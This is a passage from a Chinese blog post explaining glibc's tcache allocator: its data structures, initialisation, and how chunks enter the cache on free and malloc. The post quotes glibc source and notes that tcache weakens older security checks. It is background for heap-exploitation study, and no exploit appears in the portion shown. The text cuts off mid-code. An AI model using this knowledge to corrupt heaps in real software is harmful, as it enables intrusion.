<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="John Doe">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="John Doe">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="TCache机制TCache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无须对arena上锁即可使用，这种无锁的分配算法能有不错的性能提升，但也引入了更多的不安全性,让之前很多的代码检查都不再起作用，可以很好的绕过，libc-2.26正式引入该机制，并默认开启。 数据结构glibc在编译时使用USE_TCACHE条件来开启tcache机制，并定">
<meta property="og:type" content="article">
<meta property="og:title" content="tcache">
<meta property="og:url" content="http://example.com/2022/04/08/tcache/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="TCache机制TCache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无须对arena上锁即可使用，这种无锁的分配算法能有不错的性能提升，但也引入了更多的不安全性,让之前很多的代码检查都不再起作用，可以很好的绕过，libc-2.26正式引入该机制，并默认开启。 数据结构glibc在编译时使用USE_TCACHE条件来开启tcache机制，并定">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/403807/1597044912358-ea9fa34d-3d8c-4285-aa01-40a83a996d74.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354215.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354217.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354218.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354219.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354220.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354221.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354222.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354223.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354224.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354225.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354226.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354227.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354228.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354229.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354230.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354231.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20210203213127691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354232.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354233.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354234.png">
<meta property="article:published_time" content="2022-04-08T12:57:02.332Z">
<meta property="article:modified_time" content="2022-04-11T15:55:48.117Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/403807/1597044912358-ea9fa34d-3d8c-4285-aa01-40a83a996d74.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    
    <title>tcache · 渐渐的博客</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 5.4.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>渐渐的博客</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">渐渐的博客</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">tcache</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                tcache
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">6.5k</span>Reading time: <span class="post-count reading-time">31 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2022/04/08</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h3 id="TCache机制"><a href="#TCache机制" class="headerlink" title="TCache机制"></a>TCache机制</h3><p>TCache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无须对arena上锁即可使用，这种无锁的分配算法能有不错的性能提升，但也引入了更多的不安全性,让之前很多的代码检查都不再起作用，可以很好的绕过，libc-2.26正式引入该机制，并默认开启。</p>
<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>glibc在编译时使用USE_TCACHE条件来开启tcache机制，并定</p>
<p>义了下面这些宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，每个线程默认使用64个单链表结构的bins，每个bins最多存放7个 chunk。chunk的大小在64位机器上以16字节递增，从24到1032字节，在32位机器上则以8字节递增，从12到512字节，所以tcache bin只用于存放non-large的chunk。 然 后 引 入 了 两 个 新 的 数 据 结 构 ， tcache_entry 和tcache_perthread_struct。</p>
<p>这里引用 <a target="_blank" rel="noopener" href="https://www.yuque.com/u239977/cbzkn3/lkqwpl">0ley师傅</a>的图片</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/403807/1597044912358-ea9fa34d-3d8c-4285-aa01-40a83a996d74.png" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>tcache_perthread_struct位于堆开头的位置，这说明它本身也是一个堆块，大小为0x250。其中包含数组entries，用于放置64个bins的地址，数组counts则存放每个bins中的chunk数量。每个被放 入bins的chunk都会在其用户数据中包含一个tcache_entry（即fd指针），指向同bins中下一个chunk的user data（而不是chunk头），从而构成单链表。</p>
<p>初始化操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span>(tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    arena_get(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">    <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">        victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">        __libc_lock_unlock(ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">       - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">       typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">       memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">       allocations anyway.  */</span></span><br><span class="line">    <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">        tcache = (tcache_perthread_struct *)victim;</span><br><span class="line">        <span class="built_in">memset</span>(tcache, <span class="number">0</span>, <span class="keyword">sizeof</span>(tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><h5 id="放入堆块"><a href="#放入堆块" class="headerlink" title="放入堆块"></a>放入堆块</h5><p>首先，我们来看能够触发在tcache中放入chunk的操作。</p>
<p> <strong>释放堆块时</strong>：在fastbins的操作之前进行，如果chunk的大小符合要求，并且对应的bins还未装满，就将其放进去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = REVEAL_PTR(tmp-&gt;next))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分配堆块时</strong>，触发点有三处。</p>
<p>（1）如果从fastbins中成功返回了一个需要的chunk，那么对 </p>
<p>应fastbins中的其他chunk会被放进相应的tcache bin中，直到上 </p>
<p>限。需要注意的是chunks在tcache bin的顺序和在fastbins中的顺</p>
<p>序是反过来的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = REVEAL_PTR(tc_victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put(tc_victim, tc_idx);</span><br><span class="line">    